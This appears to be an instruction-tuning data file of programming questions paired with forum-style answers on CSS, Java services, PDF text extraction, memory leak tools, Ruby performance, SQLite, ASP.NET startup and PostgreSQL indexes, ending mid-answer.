{"instruction": "Let me make something quite clear.\nI. Hate. CSS.\nIt is a never-ending nightmare. Every minor layout change feels like a hack. Solutions to problems seem to often involve jiggering numbers around like some chef trying to work out exactly how much nutmeg to put in his soon-to-be famous rice pudding. Then comes the multiple browser issue, the multiple resolution issues..\n.. to cut a long story short, it's a pain. A PITA, if you will.\nMany frameworks seek to abstract away from HTML (custom tags, JSFs component system) in an effort to make dealing with that particular kettle of fish easier.\nIs there anything you folks have used that has a similar concept applied to CSS? Something that does a bunch of cross-browser magic for you, supports like variables (why do I have to type #3c5c8d every time I want that colour), supports caclulated fields (which are 'compiled' into CSS and JS), etc.\nAlternatively, am I even thinking about this correctly? Am I trying to push a very square block through a very round hole?", "output": "See, this is the problem with SO-- every answer so far has made a valid point and should be considered the final answer. Let me try to sum up:\n\nCSS is good! To expand further, there is a learning curve but once you learn it many things will be much easier.\n(Some) Browser inconsistencies are solvable generically.\n(Some of your) Variable and calculated field functionality can be taken care of through whatever templating engine you use.\n\nI think a combination of all these certianly solves a large sum of problems (although to be fair deeply learning CSS is not an option for everyone; some people just don't use it enough to justify the time).\nThere are some problems none of the above points cover (certain types of calculated fields would require writing a JS library for, me thinks) but it's certainly a good start."}
{"instruction": "Let me make something quite clear.\nI. Hate. CSS.\nIt is a never-ending nightmare. Every minor layout change feels like a hack. Solutions to problems seem to often involve jiggering numbers around like some chef trying to work out exactly how much nutmeg to put in his soon-to-be famous rice pudding. Then comes the multiple browser issue, the multiple resolution issues..\n.. to cut a long story short, it's a pain. A PITA, if you will.\nMany frameworks seek to abstract away from HTML (custom tags, JSFs component system) in an effort to make dealing with that particular kettle of fish easier.\nIs there anything you folks have used that has a similar concept applied to CSS? Something that does a bunch of cross-browser magic for you, supports like variables (why do I have to type #3c5c8d every time I want that colour), supports caclulated fields (which are 'compiled' into CSS and JS), etc.\nAlternatively, am I even thinking about this correctly? Am I trying to push a very square block through a very round hole?", "output": "If by some chance you happen to be using Ruby, there's Sass. It supports hierarchical selectors (using indentation to establish hierarchies), among other things, which makes life easier to an extend from a syntactical perspective (you repeat yourself a lot less). \nI am certainly with you, though. While I would consider myself a small-time CSS expert, I think it would be nice if there were tools for CSS like there are with Javascript (Prototype, JQuery, etc.). You tell the tool what you want, and it handles the browser inconsistencies behind-the-scenes. That would be ideal, methinks."}
{"instruction": "Let me make something quite clear.\nI. Hate. CSS.\nIt is a never-ending nightmare. Every minor layout change feels like a hack. Solutions to problems seem to often involve jiggering numbers around like some chef trying to work out exactly how much nutmeg to put in his soon-to-be famous rice pudding. Then comes the multiple browser issue, the multiple resolution issues..\n.. to cut a long story short, it's a pain. A PITA, if you will.\nMany frameworks seek to abstract away from HTML (custom tags, JSFs component system) in an effort to make dealing with that particular kettle of fish easier.\nIs there anything you folks have used that has a similar concept applied to CSS? Something that does a bunch of cross-browser magic for you, supports like variables (why do I have to type #3c5c8d every time I want that colour), supports caclulated fields (which are 'compiled' into CSS and JS), etc.\nAlternatively, am I even thinking about this correctly? Am I trying to push a very square block through a very round hole?", "output": "This elaborates on my previous answer.\nWhen I first started using CSS I also thought it was a pain that it didn't support variables, expressions, etc.  But as I started to use it more and more, I developed a different style to overcome these issues.  \nFor example, instead of this:\na { color: red }\n.entry { color: red }\nh1 { color: red }\n\nYou can do:\na, .entry, h1 { color: red }\n\nYou can keep the color declared in one spot by doing this.\nOnce you use CSS enough you should be able to overcome most browser inconsistencies easily.  If you find that you need to use a CSS hack there is probably a better way to do it."}
{"instruction": "I am looking for the best method to run a Java Application as a *NIX daemon or a Windows Service.  I've looked in to the Java Service Wrapper, the Apache Commons project 'jsvc', and the Apache Commons project 'procrun'.  So far, the Java Service Wrapper looks like it's the best option... but, I'm wondering if there are any other \"Open Source friendly\" licensed products out there.", "output": "Are there any special attributes that you need to apply (like OS guided resource management) that you need to support? Otherwise, for Unix you should be able to daemonize your application by writing an appropriate init.d script and setting your app to start automatically."}
{"instruction": "I am looking for the best method to run a Java Application as a *NIX daemon or a Windows Service.  I've looked in to the Java Service Wrapper, the Apache Commons project 'jsvc', and the Apache Commons project 'procrun'.  So far, the Java Service Wrapper looks like it's the best option... but, I'm wondering if there are any other \"Open Source friendly\" licensed products out there.", "output": "I've had great success with Java Service Wrapper myself.  I haven't looked at the others, but the major strengths of ServiceWrapper are:\n\nGreat x-platform support - I've used it on Windows and Linux, and found it easy on both\nSolid Documentation - The docs are clear and to the point, with great examples\nDeep per-platform support - There are some unique features in the window service management system that are supported perfectly by service wrapper (w/o restarting).  And on Windows, you will even see your app name in the process list instead of just \"java.exe\".\nStandards Compliant - Unlike many ad-hoc Java init scripts, the scripts for service wrapper tend to be compliant with LSB standards.  This can end up being very important if you ever want high availability management from something like Linux Heartbeat/HA.\n\nAnyway, just my 2 cents... :)"}
{"instruction": "Let me make something quite clear.\nI. Hate. CSS.\nIt is a never-ending nightmare. Every minor layout change feels like a hack. Solutions to problems seem to often involve jiggering numbers around like some chef trying to work out exactly how much nutmeg to put in his soon-to-be famous rice pudding. Then comes the multiple browser issue, the multiple resolution issues..\n.. to cut a long story short, it's a pain. A PITA, if you will.\nMany frameworks seek to abstract away from HTML (custom tags, JSFs component system) in an effort to make dealing with that particular kettle of fish easier.\nIs there anything you folks have used that has a similar concept applied to CSS? Something that does a bunch of cross-browser magic for you, supports like variables (why do I have to type #3c5c8d every time I want that colour), supports caclulated fields (which are 'compiled' into CSS and JS), etc.\nAlternatively, am I even thinking about this correctly? Am I trying to push a very square block through a very round hole?", "output": "For variable support, I have used PHP with CSS headers to great effect for that. I think you can do it in any language. Here is a php sample: \n<?\nheader('content-type:text/css');\nheader(\"Expires: \".gmdate(\"D, d M Y H:i:s\", (time()+900)) . \" GMT\"); \n\n$someColorVar = \"#cc0000\";\n?>\nBODY {\n      background-color: <?= someColorVar ?>;\n     }"}
{"instruction": "We get a large amount of data from our clients in pdf files in varying formats [layout-wise], these files are typically report output, and are typically properly annotated [they don't usually need OCR], but not formatted well enough that simply copying several hundred pages of text out of acrobat is not going to work.\nThe best approach I've found so far is to write a script to parse the nearly-valid xml output (the comments are invalid and many characters are escaped in varying ways, \u00e9 becomes [[[e9]]]\u00e9, $ becomes \\$, % becomes \\%...) of the command-line pdftoipe utility (to convert pdf files for a program called ipe), which gives me text elements with their positions on each page [see sample below], which works well enough for reports where the same values are on the same place on every page I care about, but would require extra scripting effort for importing matrix [cross-tab] pdf files. pdftoipe is not at all intended for this, and at best can be compiled manually using cygwin for windows.\nAre there libraries that make this easy from some scripting language I can tolerate?  A graphical tool would be awesome too.  And a pony. \npdftoipe output of this sample looks like this:\n<ipe creator=\"pdftoipe 2006/10/09\"><info media=\"0 0 612 792\"/>\n<-- Page: 1 1 -->\n<page gridsize=\"8\">\n<path fill=\"1 1 1\" fillrule=\"wind\">\n64.8 144 m\n486 144 l\n486 727.2 l\n64.8 727.2 l\n64.8 144 l\nh\n</path>\n<path fill=\"1 1 1\" fillrule=\"wind\">\n64.8 144 m\n486 144 l\n486 727.2 l\n64.8 727.2 l\n64.8 144 l\nh\n</path>\n<path fill=\"1 1 1\" fillrule=\"wind\">\n64.8 144 m\n486 144 l\n486 727.2 l\n64.8 727.2 l\n64.8 144 l\nh\n</path>\n<text stroke=\"1 0 0\" pos=\"0 0\" size=\"18\" transformable=\"yes\" matrix=\"1 0 0 1 181.8 707.88\">This is a sample PDF fil</text>\n<text stroke=\"1 0 0\" pos=\"0 0\" size=\"18\" transformable=\"yes\" matrix=\"1 0 0 1 356.28 707.88\">e.</text>\n<text stroke=\"1 0 0\" pos=\"0 0\" size=\"18\" transformable=\"yes\" matrix=\"1 0 0 1 368.76 707.88\"> </text>\n<text stroke=\"0 0 0\" pos=\"0 0\" size=\"12.6\" transformable=\"yes\" matrix=\"1 0 0 1 67.32 692.4\"> </text>\n<text stroke=\"0 0 0\" pos=\"0 0\" size=\"12.6\" transformable=\"yes\" matrix=\"1 0 0 1 67.32 677.88\"> </text>\n<text stroke=\"0 0 0\" pos=\"0 0\" size=\"12.6\" transformable=\"yes\" matrix=\"1 0 0 1 67.32 663.36\"> </text>\n<text stroke=\"0 0 0\" pos=\"0 0\" size=\"12.6\" transformable=\"yes\" matrix=\"1 0 0 1 67.32 648.84\"> </text>\n<text stroke=\"0 0 0\" pos=\"0 0\" size=\"12.6\" transformable=\"yes\" matrix=\"1 0 0 1 67.32 634.32\"> </text>\n<text stroke=\"0 0 0\" pos=\"0 0\" size=\"12.6\" transformable=\"yes\" matrix=\"1 0 0 1 67.32 619.8\"> </text>\n<text stroke=\"0 0 0\" pos=\"0 0\" size=\"12.6\" transformable=\"yes\" matrix=\"1 0 0 1 67.32 605.28\"> </text>\n<text stroke=\"0 0 0\" pos=\"0 0\" size=\"12.6\" transformable=\"yes\" matrix=\"1 0 0 1 67.32 590.76\"> </text>\n<text stroke=\"0 0 0\" pos=\"0 0\" size=\"12.6\" transformable=\"yes\" matrix=\"1 0 0 1 67.32 576.24\"> </text>\n<text stroke=\"0 0 0\" pos=\"0 0\" size=\"12.6\" transformable=\"yes\" matrix=\"1 0 0 1 67.32 561.72\"> </text>\n<text stroke=\"0 0 0\" pos=\"0 0\" size=\"12.6\" transformable=\"yes\" matrix=\"1 0 0 1 67.32 547.2\"> </text>\n<text stroke=\"0 0 0\" pos=\"0 0\" size=\"12.6\" transformable=\"yes\" matrix=\"1 0 0 1 67.32 532.68\"> </text>\n<text stroke=\"0 0 0\" pos=\"0 0\" size=\"12.6\" transformable=\"yes\" matrix=\"1 0 0 1 67.32 518.16\"> </text>\n<text stroke=\"0 0 0\" pos=\"0 0\" size=\"12.6\" transformable=\"yes\" matrix=\"1 0 0 1 67.32 503.64\"> </text>\n<text stroke=\"0 0 0\" pos=\"0 0\" size=\"12.6\" transformable=\"yes\" matrix=\"1 0 0 1 67.32 489.12\"> </text>\n<text stroke=\"0 0 0\" pos=\"0 0\" size=\"12.6\" transformable=\"yes\" matrix=\"1 0 0 1 67.32 474.6\"> </text>\n<text stroke=\"0 0 1\" pos=\"0 0\" size=\"16.2\" transformable=\"yes\" matrix=\"1 0 0 1 67.32 456.24\">If you can read this</text>\n<text stroke=\"0 0 1\" pos=\"0 0\" size=\"16.2\" transformable=\"yes\" matrix=\"1 0 0 1 214.92 456.24\">,</text>\n<text stroke=\"0 0 1\" pos=\"0 0\" size=\"16.2\" transformable=\"yes\" matrix=\"1 0 0 1 219.48 456.24\"> you already have A</text>\n<text stroke=\"0 0 1\" pos=\"0 0\" size=\"16.2\" transformable=\"yes\" matrix=\"1 0 0 1 370.8 456.24\">dobe Acrobat </text>\n<text stroke=\"0 0 1\" pos=\"0 0\" size=\"16.2\" transformable=\"yes\" matrix=\"1 0 0 1 67.32 437.64\">Reader i</text>\n<text stroke=\"0 0 1\" pos=\"0 0\" size=\"16.2\" transformable=\"yes\" matrix=\"1 0 0 1 131.28 437.64\">n</text>\n<text stroke=\"0 0 1\" pos=\"0 0\" size=\"16.2\" transformable=\"yes\" matrix=\"1 0 0 1 141.12 437.64\">stalled on your computer.</text>\n<text stroke=\"0 0 0\" pos=\"0 0\" size=\"16.2\" transformable=\"yes\" matrix=\"1 0 0 1 337.92 437.64\"> </text>\n<text stroke=\"0 0.502 0\" pos=\"0 0\" size=\"12.6\" transformable=\"yes\" matrix=\"1 0 0 1 342.48 437.64\"> </text>\n<image width=\"800\" height=\"600\" rect=\"-92.04 800.64 374.4 449.76\" ColorSpace=\"DeviceRGB\" BitsPerComponent=\"8\" Filter=\"DCTDecode\" length=\"369925\">\nfeedcafebabe...\n</image>\n</page>\n</ipe>", "output": "Have you looked at Aspose? We're using it for an ASP.net app and I've seen some examples of vbscript using it as well. It's not particularly expensive either.\nhttp://www.aspose.com/"}
{"instruction": "Let me make something quite clear.\nI. Hate. CSS.\nIt is a never-ending nightmare. Every minor layout change feels like a hack. Solutions to problems seem to often involve jiggering numbers around like some chef trying to work out exactly how much nutmeg to put in his soon-to-be famous rice pudding. Then comes the multiple browser issue, the multiple resolution issues..\n.. to cut a long story short, it's a pain. A PITA, if you will.\nMany frameworks seek to abstract away from HTML (custom tags, JSFs component system) in an effort to make dealing with that particular kettle of fish easier.\nIs there anything you folks have used that has a similar concept applied to CSS? Something that does a bunch of cross-browser magic for you, supports like variables (why do I have to type #3c5c8d every time I want that colour), supports caclulated fields (which are 'compiled' into CSS and JS), etc.\nAlternatively, am I even thinking about this correctly? Am I trying to push a very square block through a very round hole?", "output": "Solutions to problems seem to often involve jiggering numbers around like some chef trying to work out exactly how much nutmeg to put in his soon-to-be famous rice pudding\n\nI only get this when trying to make stuff work in IE.\nIf you learn CSS to the point where you can code most things without having to look up the reference (if you're still looking up reference regularly you don't really know it and can't claim to complain I think), and then develop for firefox/safari, it's a pretty nice place to be in.\nLeave the pain and suffering of IE compatibilit to the end after it works in FF/Safari, so your mind will attribute the blame to IE, where it damn well belongs, rather than CSS in general."}
{"instruction": "We get a large amount of data from our clients in pdf files in varying formats [layout-wise], these files are typically report output, and are typically properly annotated [they don't usually need OCR], but not formatted well enough that simply copying several hundred pages of text out of acrobat is not going to work.\nThe best approach I've found so far is to write a script to parse the nearly-valid xml output (the comments are invalid and many characters are escaped in varying ways, \u00e9 becomes [[[e9]]]\u00e9, $ becomes \\$, % becomes \\%...) of the command-line pdftoipe utility (to convert pdf files for a program called ipe), which gives me text elements with their positions on each page [see sample below], which works well enough for reports where the same values are on the same place on every page I care about, but would require extra scripting effort for importing matrix [cross-tab] pdf files. pdftoipe is not at all intended for this, and at best can be compiled manually using cygwin for windows.\nAre there libraries that make this easy from some scripting language I can tolerate?  A graphical tool would be awesome too.  And a pony. \npdftoipe output of this sample looks like this:\n<ipe creator=\"pdftoipe 2006/10/09\"><info media=\"0 0 612 792\"/>\n<-- Page: 1 1 -->\n<page gridsize=\"8\">\n<path fill=\"1 1 1\" fillrule=\"wind\">\n64.8 144 m\n486 144 l\n486 727.2 l\n64.8 727.2 l\n64.8 144 l\nh\n</path>\n<path fill=\"1 1 1\" fillrule=\"wind\">\n64.8 144 m\n486 144 l\n486 727.2 l\n64.8 727.2 l\n64.8 144 l\nh\n</path>\n<path fill=\"1 1 1\" fillrule=\"wind\">\n64.8 144 m\n486 144 l\n486 727.2 l\n64.8 727.2 l\n64.8 144 l\nh\n</path>\n<text stroke=\"1 0 0\" pos=\"0 0\" size=\"18\" transformable=\"yes\" matrix=\"1 0 0 1 181.8 707.88\">This is a sample PDF fil</text>\n<text stroke=\"1 0 0\" pos=\"0 0\" size=\"18\" transformable=\"yes\" matrix=\"1 0 0 1 356.28 707.88\">e.</text>\n<text stroke=\"1 0 0\" pos=\"0 0\" size=\"18\" transformable=\"yes\" matrix=\"1 0 0 1 368.76 707.88\"> </text>\n<text stroke=\"0 0 0\" pos=\"0 0\" size=\"12.6\" transformable=\"yes\" matrix=\"1 0 0 1 67.32 692.4\"> </text>\n<text stroke=\"0 0 0\" pos=\"0 0\" size=\"12.6\" transformable=\"yes\" matrix=\"1 0 0 1 67.32 677.88\"> </text>\n<text stroke=\"0 0 0\" pos=\"0 0\" size=\"12.6\" transformable=\"yes\" matrix=\"1 0 0 1 67.32 663.36\"> </text>\n<text stroke=\"0 0 0\" pos=\"0 0\" size=\"12.6\" transformable=\"yes\" matrix=\"1 0 0 1 67.32 648.84\"> </text>\n<text stroke=\"0 0 0\" pos=\"0 0\" size=\"12.6\" transformable=\"yes\" matrix=\"1 0 0 1 67.32 634.32\"> </text>\n<text stroke=\"0 0 0\" pos=\"0 0\" size=\"12.6\" transformable=\"yes\" matrix=\"1 0 0 1 67.32 619.8\"> </text>\n<text stroke=\"0 0 0\" pos=\"0 0\" size=\"12.6\" transformable=\"yes\" matrix=\"1 0 0 1 67.32 605.28\"> </text>\n<text stroke=\"0 0 0\" pos=\"0 0\" size=\"12.6\" transformable=\"yes\" matrix=\"1 0 0 1 67.32 590.76\"> </text>\n<text stroke=\"0 0 0\" pos=\"0 0\" size=\"12.6\" transformable=\"yes\" matrix=\"1 0 0 1 67.32 576.24\"> </text>\n<text stroke=\"0 0 0\" pos=\"0 0\" size=\"12.6\" transformable=\"yes\" matrix=\"1 0 0 1 67.32 561.72\"> </text>\n<text stroke=\"0 0 0\" pos=\"0 0\" size=\"12.6\" transformable=\"yes\" matrix=\"1 0 0 1 67.32 547.2\"> </text>\n<text stroke=\"0 0 0\" pos=\"0 0\" size=\"12.6\" transformable=\"yes\" matrix=\"1 0 0 1 67.32 532.68\"> </text>\n<text stroke=\"0 0 0\" pos=\"0 0\" size=\"12.6\" transformable=\"yes\" matrix=\"1 0 0 1 67.32 518.16\"> </text>\n<text stroke=\"0 0 0\" pos=\"0 0\" size=\"12.6\" transformable=\"yes\" matrix=\"1 0 0 1 67.32 503.64\"> </text>\n<text stroke=\"0 0 0\" pos=\"0 0\" size=\"12.6\" transformable=\"yes\" matrix=\"1 0 0 1 67.32 489.12\"> </text>\n<text stroke=\"0 0 0\" pos=\"0 0\" size=\"12.6\" transformable=\"yes\" matrix=\"1 0 0 1 67.32 474.6\"> </text>\n<text stroke=\"0 0 1\" pos=\"0 0\" size=\"16.2\" transformable=\"yes\" matrix=\"1 0 0 1 67.32 456.24\">If you can read this</text>\n<text stroke=\"0 0 1\" pos=\"0 0\" size=\"16.2\" transformable=\"yes\" matrix=\"1 0 0 1 214.92 456.24\">,</text>\n<text stroke=\"0 0 1\" pos=\"0 0\" size=\"16.2\" transformable=\"yes\" matrix=\"1 0 0 1 219.48 456.24\"> you already have A</text>\n<text stroke=\"0 0 1\" pos=\"0 0\" size=\"16.2\" transformable=\"yes\" matrix=\"1 0 0 1 370.8 456.24\">dobe Acrobat </text>\n<text stroke=\"0 0 1\" pos=\"0 0\" size=\"16.2\" transformable=\"yes\" matrix=\"1 0 0 1 67.32 437.64\">Reader i</text>\n<text stroke=\"0 0 1\" pos=\"0 0\" size=\"16.2\" transformable=\"yes\" matrix=\"1 0 0 1 131.28 437.64\">n</text>\n<text stroke=\"0 0 1\" pos=\"0 0\" size=\"16.2\" transformable=\"yes\" matrix=\"1 0 0 1 141.12 437.64\">stalled on your computer.</text>\n<text stroke=\"0 0 0\" pos=\"0 0\" size=\"16.2\" transformable=\"yes\" matrix=\"1 0 0 1 337.92 437.64\"> </text>\n<text stroke=\"0 0.502 0\" pos=\"0 0\" size=\"12.6\" transformable=\"yes\" matrix=\"1 0 0 1 342.48 437.64\"> </text>\n<image width=\"800\" height=\"600\" rect=\"-92.04 800.64 374.4 449.76\" ColorSpace=\"DeviceRGB\" BitsPerComponent=\"8\" Filter=\"DCTDecode\" length=\"369925\">\nfeedcafebabe...\n</image>\n</page>\n</ipe>", "output": "We use Xpdf in one of our applications. Its a c++ library which is primarily used for pdf rendering, although it does have a text extractor which could be useful for this project."}
{"instruction": "Let me make something quite clear.\nI. Hate. CSS.\nIt is a never-ending nightmare. Every minor layout change feels like a hack. Solutions to problems seem to often involve jiggering numbers around like some chef trying to work out exactly how much nutmeg to put in his soon-to-be famous rice pudding. Then comes the multiple browser issue, the multiple resolution issues..\n.. to cut a long story short, it's a pain. A PITA, if you will.\nMany frameworks seek to abstract away from HTML (custom tags, JSFs component system) in an effort to make dealing with that particular kettle of fish easier.\nIs there anything you folks have used that has a similar concept applied to CSS? Something that does a bunch of cross-browser magic for you, supports like variables (why do I have to type #3c5c8d every time I want that colour), supports caclulated fields (which are 'compiled' into CSS and JS), etc.\nAlternatively, am I even thinking about this correctly? Am I trying to push a very square block through a very round hole?", "output": "Also check out BlueprintCSS, a layout framework in CSS. It doesn't solve all your problems, but many, and you don't have to write the CSS yourself."}
{"instruction": "I have a .exe and many plug-in .dll modules that the .exe loads. (I have source for both.) A cross-platform (with source) solution would be ideal, but the platform can be narrowed to WinXP and Visual Studio (7.1/2003 in my case).\nThe built-in VS leak detector only gives the line where new/malloc was called from, but I have a wrapper for allocations, so a full symbolic stack trace would be best.\nThe detector would also be able to detect for a leak in both the .exe and its accompanying plug-in .dll modules.", "output": "I have had good experiences with Rational Purify. I have also heard nice things about Valgrind"}
{"instruction": "How do I convert the RGB values of a pixel to a single monochrome value?", "output": "This recent scientific article compares the state-of-the-art in converting color photographs to grayscale, including the simple luminance formula and more complex techniques."}
{"instruction": "How do I convert the RGB values of a pixel to a single monochrome value?", "output": "As mentioned also, a grayscale translation (note that monochromatic images need not to be in grayscale) from an RGB-triplet is subject to taste. \nFor example, you could cheat, extract only the blue component, by simply throwing the red and green components away, and copying the blue value in their stead. Another simple and generally ok solution would be to take the average of the pixel's RGB-triplet and use that value in all three components.\nThe fact that there's a considerable market for professional and not-very-cheap-at-all-no-sirree grayscale/monochrome converter plugins for Photoshop alone, tells that the conversion is just as simple or complex as you wish."}
{"instruction": "I have a .exe and many plug-in .dll modules that the .exe loads. (I have source for both.) A cross-platform (with source) solution would be ideal, but the platform can be narrowed to WinXP and Visual Studio (7.1/2003 in my case).\nThe built-in VS leak detector only gives the line where new/malloc was called from, but I have a wrapper for allocations, so a full symbolic stack trace would be best.\nThe detector would also be able to detect for a leak in both the .exe and its accompanying plug-in .dll modules.", "output": "Try Jochen Kalmbach's Memory Leak Detector on Code Project.\nThe URL to the latest version was somewhere in the comments when I last checked."}
{"instruction": "I have a .exe and many plug-in .dll modules that the .exe loads. (I have source for both.) A cross-platform (with source) solution would be ideal, but the platform can be narrowed to WinXP and Visual Studio (7.1/2003 in my case).\nThe built-in VS leak detector only gives the line where new/malloc was called from, but I have a wrapper for allocations, so a full symbolic stack trace would be best.\nThe detector would also be able to detect for a leak in both the .exe and its accompanying plug-in .dll modules.", "output": "I personally use Visual Leak Detector, though it can cause large delays when large blocks are leaked (it displays the contents of the entire leaked block)."}
{"instruction": "I'm pretty keen to develop my first Ruby app, as my company has finally blessed its use internally.\nIn everything I've read about Ruby up to v1.8, there is never anything positive said about performance, but I've found nothing about version 1.9. The last figures I saw about 1.8 had it drastically slower than just about everything out there, so I'm hoping this was addressed in 1.9.\nHas performance drastically improved? Are there some concrete things that can be done with Ruby apps (or things to avoid) to keep performance at the best possible level?", "output": "I've actually heard really good things performance with about the JVM implementation, JRuby. Completly anecdotal, but perhaps worth looking into.\nSee also http://en.wikipedia.org/wiki/JRuby#Performance"}
{"instruction": "I am looking for open source or free data collaboration software. Specifically this is for a non-profit organization that wants to teach remote students how a foreign language.  The idea is that an instructor would teach a class and there would be up to 10 students in the class at a time.  The instructor would be able to post slides or other teaching material and the students would be able to see it on their computers remotely.  Video is not required but audio is a must.  Any recommendations?\nAlso if there have been any reviews or feature comparison amongst these products, I would be interested in hearing about them.", "output": "Although it's not what you're looking for, Moodle might be of use to you if you're looking into having online courses."}
{"instruction": "I'm pretty keen to develop my first Ruby app, as my company has finally blessed its use internally.\nIn everything I've read about Ruby up to v1.8, there is never anything positive said about performance, but I've found nothing about version 1.9. The last figures I saw about 1.8 had it drastically slower than just about everything out there, so I'm hoping this was addressed in 1.9.\nHas performance drastically improved? Are there some concrete things that can be done with Ruby apps (or things to avoid) to keep performance at the best possible level?", "output": "There are some benchmarks of 1.8 vs 1.9 at http://www.rubychan.de/share/yarv_speedups.html. Overall, it looks like 1.9 is a lot faster in most cases."}
{"instruction": "I've done this before in C++ by including sqlite.h but is there a similarly easy way in C#?", "output": "There is a list of Sqlite wrappers for .Net at http://www.sqlite.org/cvstrac/wiki?p=SqliteWrappers. From what I've heard http://sqlite.phxsoftware.com/ is quite good. This particular one lets you access Sqlite through ADO.Net just like any other database."}
{"instruction": "I've done this before in C++ by including sqlite.h but is there a similarly easy way in C#?", "output": "ADO.NET 2.0 Provider for SQLite has over 200 downloads every day, so I think you are safe using that one."}
{"instruction": "I'm pretty keen to develop my first Ruby app, as my company has finally blessed its use internally.\nIn everything I've read about Ruby up to v1.8, there is never anything positive said about performance, but I've found nothing about version 1.9. The last figures I saw about 1.8 had it drastically slower than just about everything out there, so I'm hoping this was addressed in 1.9.\nHas performance drastically improved? Are there some concrete things that can be done with Ruby apps (or things to avoid) to keep performance at the best possible level?", "output": "Matz ruby 1.8.6 is much slower when it comes to performance and 1.9 and JRuby do alot to speed it up.  But the performance isn't such that it will prevent you from doing anything you want in a web application.  There are many large Ruby on Rails sites that do just fine with the \"slower interpreted\" language.  When you get to scaling out web apps there are many more pressing performance issues than the speed of the language you are writing it in."}
{"instruction": "Over the last few months/years, I have shared a folder or two with numerous people on my domain. How do I easily revoke those shares to keep access to my system nice and tidy?", "output": "On Windows XP, go to:\nAdministrative Tools > Computer Management > System Tools > Shared Folders > Shares\n\nThis page lists all shares and lets you remove them easily, in one place."}
{"instruction": "Over the last few months/years, I have shared a folder or two with numerous people on my domain. How do I easily revoke those shares to keep access to my system nice and tidy?", "output": "Using computer management (an MMC snap-in. See Control Panel Administrative tools) you can see a list of all folders that are shared. You could delete the shares or change the permissions on the share to only allow access for certain people or groups."}
{"instruction": "I'm pretty keen to develop my first Ruby app, as my company has finally blessed its use internally.\nIn everything I've read about Ruby up to v1.8, there is never anything positive said about performance, but I've found nothing about version 1.9. The last figures I saw about 1.8 had it drastically slower than just about everything out there, so I'm hoping this was addressed in 1.9.\nHas performance drastically improved? Are there some concrete things that can be done with Ruby apps (or things to avoid) to keep performance at the best possible level?", "output": "If scalability and performance are really important to you you can also check out Ruby Enterprise Edition.  It's a custom implementation of the Ruby interpreter that's supposed to be much better about memory allocation and garbage collection.  I haven't seen any objective metrics comparing it directly to JRuby, but all of the anectdotal evidence I've heard has been very very good.\nThis is from the same company that created Passenger (aka mod_rails) which you should definitely check out as a rails deployment solution if you decide not to go the JRuby route."}
{"instruction": "The first time I load the website in the production web server, it start very slow, subsequent pages load very quickly (included the home page).\nI precompiled the site, but nothing changes. \nI don't have any code at Application start.\nI don't have cached items.\nAny ideas? How can I find out what is happening?", "output": "This sounds very much like background compiling; though if you're precompiling, that shouldn't be an issue.\nFirst thing I would look at is your ORM (if any). NHibernate, in particular, has a serious startup penalty, as it runs multiple compilers in the background at startup to turn each class in your data layer into its own in-memory assembly."}
{"instruction": "The first time I load the website in the production web server, it start very slow, subsequent pages load very quickly (included the home page).\nI precompiled the site, but nothing changes. \nI don't have any code at Application start.\nI don't have cached items.\nAny ideas? How can I find out what is happening?", "output": "When you published the site, did you choose to make the website \"updatable\" in the publish website's settings or not? If I remember well, the aspx / ascx file need to be compiled as well, and if they are \"updatable\" then the first start will cause a recompile of those resources."}
{"instruction": "The first time I load the website in the production web server, it start very slow, subsequent pages load very quickly (included the home page).\nI precompiled the site, but nothing changes. \nI don't have any code at Application start.\nI don't have cached items.\nAny ideas? How can I find out what is happening?", "output": "Have you turned on tracing in your web.config?"}
{"instruction": "The first time I load the website in the production web server, it start very slow, subsequent pages load very quickly (included the home page).\nI precompiled the site, but nothing changes. \nI don't have any code at Application start.\nI don't have cached items.\nAny ideas? How can I find out what is happening?", "output": "It's just your app domain loading up and loading any binaries into memory. Also, it's initializing static variables, so if you have a static variable that loads up a lot of data from the db, it might take a bit."}
{"instruction": "Let me make something quite clear.\nI. Hate. CSS.\nIt is a never-ending nightmare. Every minor layout change feels like a hack. Solutions to problems seem to often involve jiggering numbers around like some chef trying to work out exactly how much nutmeg to put in his soon-to-be famous rice pudding. Then comes the multiple browser issue, the multiple resolution issues..\n.. to cut a long story short, it's a pain. A PITA, if you will.\nMany frameworks seek to abstract away from HTML (custom tags, JSFs component system) in an effort to make dealing with that particular kettle of fish easier.\nIs there anything you folks have used that has a similar concept applied to CSS? Something that does a bunch of cross-browser magic for you, supports like variables (why do I have to type #3c5c8d every time I want that colour), supports caclulated fields (which are 'compiled' into CSS and JS), etc.\nAlternatively, am I even thinking about this correctly? Am I trying to push a very square block through a very round hole?", "output": "I believe the common errors beginners have with CSS are to do with specificity. If you're styling the a tag, are you sure you really want to be styling every single one in the document or a certain \"class\" of a tags? \nI usually start out being very specific with my CSS selectors and generalize them when I see fit.\nHere's a humerours article on the subject, but also informational:\nSpecificity Wars"}
{"instruction": "The first time I load the website in the production web server, it start very slow, subsequent pages load very quickly (included the home page).\nI precompiled the site, but nothing changes. \nI don't have any code at Application start.\nI don't have cached items.\nAny ideas? How can I find out what is happening?", "output": "Just a quick nod at Darren. That's typical behavior of a .NET app after a DLL update is made. After the initial load everything should zip along just fine."}
{"instruction": "What tools would you recommend for setting up CI for build and deployment of multiple websites built on DotNetNuke using SVN for source control? \nWe are currently looking at configuring Cruise Control to work with NAnt, NUnit, NCover and Trac as a test case. What other combinations would worth investigating?\nWe have full control of our development environment so using some form of CI is certain here but I would also like to convince our production services team that they can reliably deploy to the system test, uat and even production environments using these tools.", "output": "We use CruiseControl.NET running msbuild scripts. Msbuild is responsible for updating from SVN on every commit, compiling, and running FxCop and NCover/NUnit."}
{"instruction": "From what information I could find, they both solve the same problems - more esoteric operations like array containment and intersection (&&, @>, <@, etc). However I would be interested in advice about when to use one or the other (or neither possibly).\nThe PostgreSQL documentation has some information about this:\n\nGIN index lookups are about three times faster than GiST\nGIN indexes take about three times longer to build than GiST\nGIN indexes are about ten times slower to update than GiST\nGIN indexes are two-to-three times larger than GiST\n\nHowever I would be particularly interested to know if there is a performance impact when the memory to index size ration starts getting small (ie. the index size becomes much bigger than the available memory)? I've been told on the #postgresql IRC channel that GIN needs to keep all the index in memory, otherwise it won't be effective, because, unlike B-Tree, it doesn't know which part to read in from disk for a particular query? The question would be: is this true (because I've also been told the opposite of this)? Does GiST have the same restrictions? Are there other restrictions I should be aware of while using one of these indexing algorithms?", "output": "First of all, do you need to use them for text search indexing? GIN and GiST are index specialized for some data types. If you need to index simple char or integer values then the normal B-Tree index is the best.\nAnyway, PostgreSQL documentation has a chapter on GIST and one on GIN, where you can find more info.\nAnd, last but not least, the best way to find which is best is to generate sample data (as much as you need to be a real scenario) and then create a GIST index, measuring how much time is 